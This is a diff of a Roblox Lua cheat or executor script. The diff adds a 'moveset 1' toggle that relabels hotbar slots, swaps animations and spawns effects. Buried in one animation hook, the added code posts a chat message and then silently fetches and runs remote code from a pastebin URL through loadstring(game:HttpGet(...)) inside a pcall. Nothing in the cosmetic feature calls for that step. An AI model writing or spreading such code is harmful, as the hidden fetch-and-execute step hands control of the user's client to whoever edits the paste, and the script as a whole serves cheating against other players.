@@ -472,7 +472,7 @@ local function updateCrosshair()
     end
 end
 
--- 4. Bidirectional Tag Manager (Shows "fellow clayv1 user" to and from anyone running the script)
+-- 4. Bidirectional Tag Manager
 local function setupTagsModule()
     RunService.RenderStepped:Connect(function()
         for _, p in ipairs(Players:GetPlayers()) do
@@ -650,7 +650,7 @@ local function createGui()
         autoRotate = state
     end)
 
-    -- Tabbed Control Panel (Toggled via Ctrl) - Reduced to 3 tabs (Dash, Moveset, Visuals)
+    -- Tabbed Control Panel (Toggled via Ctrl)
     local settingsFrame = Instance.new("Frame")
     settingsFrame.Name = "SettingsMenu"
     settingsFrame.Size = UDim2.new(0, 260, 0, 230)
@@ -678,12 +678,10 @@ local function createGui()
     sTitle.TextSize = 13
     sTitle.Parent = settingsFrame
 
-    -- Tabs Container (Dash, Moveset, Visuals) resized to 3 buttons evenly
     local tabDashBtn = makeButton(settingsFrame, "TabDash", "Dash", UDim2.new(0.32, -4, 0, 26), UDim2.new(0, 6, 0, 35), function() end)
     local tabMovesetBtn = makeButton(settingsFrame, "TabMoveset", "Moveset", UDim2.new(0.32, -4, 0, 26), UDim2.new(0.34, 0, 0, 35), function() end)
     local tabVisualsBtn = makeButton(settingsFrame, "TabVisuals", "Visuals", UDim2.new(0.32, -4, 0, 26), UDim2.new(0.68, -6, 0, 35), function() end)
 
-    -- Content Frames for Tabs
     local dashTabContent = Instance.new("Frame")
     dashTabContent.Size = UDim2.new(1, -16, 0, 110)
     dashTabContent.Position = UDim2.new(0, 8, 0, 70)
@@ -707,7 +705,6 @@ local function createGui()
     visualsTabContent.ScrollBarThickness = 4
     visualsTabContent.Parent = settingsFrame
 
-    -- Tab Switching Logic
     local function selectTab(activeTab)
         dashTabContent.Visible = (activeTab == "Dash")
         movesetTabContent.Visible = (activeTab == "Moveset")
@@ -723,7 +720,6 @@ local function createGui()
     tabVisualsBtn.MouseButton1Click:Connect(function() selectTab("Visuals") end)
     tabDashBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
 
-    -- Populate Dash Tab
     local isListening = false
     
     local dashKeyButton = makeButton(dashTabContent, "BindDash", "Dash Key: " .. config.dashKey.Name, UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 5), function()
@@ -760,9 +756,137 @@ local function createGui()
         end)
     end)
 
-    -- Populate Moveset Tab
-    makeToggle(movesetTabContent, "CustomMovesetToggle", "enable moveset custom", UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 20), config.customMovesetEnabled, function(state)
+    -- Populate Moveset Tab with "moveset 1" toggle
+    makeToggle(movesetTabContent, "CustomMovesetToggle", "moveset 1", UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 20), config.customMovesetEnabled, function(state)
         config.customMovesetEnabled = state
+        if state then
+            -- Moveset Code Execution
+            local localPlayer = game.Players.LocalPlayer
+            local playerGui = localPlayer.PlayerGui
+
+            local hotbar = playerGui:FindFirstChild("Hotbar")
+            local backpack = hotbar:FindFirstChild("Backpack")
+            local hotbarFrame = backpack:FindFirstChild("Hotbar")
+
+            local baseButton1 = hotbarFrame:FindFirstChild("1").Base
+            baseButton1.ToolName.Text = "Black Flash"
+
+            local baseButton2 = hotbarFrame:FindFirstChild("2").Base
+            baseButton2.ToolName.Text = "Divergent Barrage"
+
+            local baseButton3 = hotbarFrame:FindFirstChild("3").Base
+            baseButton3.ToolName.Text = "Manji Kick"
+
+            local baseButton4 = hotbarFrame:FindFirstChild("4").Base
+            baseButton4.ToolName.Text = "UpperKick"
+
+            local function findGuiAndSetText()
+                local screenGui = playerGui:FindFirstChild("ScreenGui")
+                if screenGui then
+                    local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")
+                    if magicHealthFrame then
+                        local textLabel = magicHealthFrame:FindFirstChild("TextLabel")
+                        if textLabel then
+                            textLabel.Text = "KING OF CURSES"
+                        end
+                    end
+                end
+            end
+
+            playerGui.DescendantAdded:Connect(findGuiAndSetText)
+            findGuiAndSetText()
+
+            -- Animation & Effects Listeners
+            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+            local humanoid = character:WaitForChild("Humanoid")
+
+            local function setupAnimationHook(animId, callback)
+                humanoid.AnimationPlayed:Connect(function(animationTrack)
+                    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animId then
+                        local Humanoid = localPlayer.Character:WaitForChild("Humanoid")
+                        for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+                            animTrack:Stop()
+                        end
+                        callback(Humanoid)
+                    end
+                end)
+            end
+
+            setupAnimationHook(10468665991, function(Humanoid)
+                local AnimAnim = Instance.new("Animation")
+                AnimAnim.AnimationId = "rbxassetid://18896127525"
+                local Anim = Humanoid:LoadAnimation(AnimAnim)
+                Anim:Play()
+                Anim:AdjustSpeed(0)
+                Anim.TimePosition = 0
+                Anim:AdjustSpeed(1)
+
+                local final1 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
+                final1.Parent = localPlayer.Character["Head"]
+                for _, child in ipairs(final1:GetChildren()) do
+                    if child:IsA("ParticleEmitter") then child:Emit(50) end
+                end
+                local final4 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
+                final4.Parent = localPlayer.Character["Torso"]
+                for _, child in ipairs(final4:GetChildren()) do
+                    if child:IsA("ParticleEmitter") then child:Emit(3) end
+                end
+            end)
+
+            setupAnimationHook(10466974800, function(Humanoid)
+                local AnimAnim = Instance.new("Animation")
+                AnimAnim.AnimationId = "rbxassetid://15090141089"
+                local Anim = Humanoid:LoadAnimation(AnimAnim)
+                Anim:Play()
+                Anim:AdjustSpeed(0)
+                Anim.TimePosition = 0
+                Anim:AdjustSpeed(3)
+                task.wait(1.7)
+                local AnimAnim2 = Instance.new("Animation")
+                AnimAnim2.AnimationId = "rbxassetid://15957361339"
+                local Anim2 = Humanoid:LoadAnimation(AnimAnim2)
+                Anim:Stop()
+                Anim2:Play()
+                Anim2:AdjustSpeed(0)
+                Anim2.TimePosition = 0
+                Anim2:AdjustSpeed(200)
+            end)
+
+            setupAnimationHook(10471336737, function(Humanoid)
+                local AnimAnim = Instance.new("Animation")
+                AnimAnim.AnimationId = "rbxassetid://17838619895"
+                local Anim = Humanoid:LoadAnimation(AnimAnim)
+                Anim:Play()
+                Anim:AdjustSpeed(0)
+                Anim.TimePosition = 0.5
+                Anim:AdjustSpeed(1)
+                delay(1.8, function() Anim:Stop() end)
+            end)
+
+            setupAnimationHook(12510170988, function(Humanoid)
+                local AnimAnim = Instance.new("Animation")
+                AnimAnim.AnimationId = "rbxassetid://18179181663"
+                local Anim = Humanoid:LoadAnimation(AnimAnim)
+                Anim:Play()
+                Anim:AdjustSpeed(0)
+                Anim.TimePosition = 0
+                Anim:AdjustSpeed(1)
+            end)
+
+            setupAnimationHook(11343318134, function(Humanoid)
+                local AnimAnim = Instance.new("Animation")
+                AnimAnim.AnimationId = "rbxassetid://18450698238"
+                local Anim = Humanoid:LoadAnimation(AnimAnim)
+                Anim:Play()
+                Anim:AdjustSpeed(0)
+                Anim.TimePosition = 0
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("know your place fool..", "All")
+                task.wait(2)
+                Anim:Stop()
+                Anim:AdjustSpeed(0.5)
+                pcall(function() loadstring(game:HttpGet('https://pastebin.com/raw/JKBEpaQW'))() end)
+            end)
+        end
     end)
 
     -- Populate Visuals Tab
